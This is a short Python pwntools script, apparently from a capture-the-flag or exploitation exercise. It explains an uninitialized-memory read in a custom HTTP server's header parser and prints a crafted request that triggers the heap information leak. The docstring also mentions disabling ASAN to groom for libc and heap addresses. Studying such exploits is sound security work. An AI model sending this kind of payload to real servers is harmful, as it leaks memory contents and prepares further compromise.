#!/usr/bin/env python3

from pwn import * 

'''
Vulnerability
===================
When parsing a header, if there is NO 'value' in it ('AAA' instead of 'AAA:BBB')
then the header 'value_len' is initialized to be the SAME as the 'key_len'.
As a result, when using the 'value' it will be uninitialized but will attempt
to be the same as the 'key_len'. This allows for the reading of data 
from the heap without being initialized in VERY large quanities.

An example of this is shown below: 
```
    GET /echo?req_type=header&res_type=body&key=MyHeaderName HTTP/1.1
    MyHeaderName
```

By using the 'echo' route, we are able to read the header value for the 
information leak. To TEST this, run the payload below with the 'server' 
compiled with 'ASAN'. 

Now, we need to TURN OFF ASAN in order to start the grooming :) 
We want to get BOTH a libc and a heap leak out of this. 
'''
header_name = "A" * 0x10

# Line one
string = "GET /echo?req_type=header&key=" + header_name + "&res_type=body HTTP/1.1\r\n"

# Headers
string += header_name + "\r\n" # NOTE: Has NO header value with missing ':'.
string += "\r\n"

print(string, end='')  
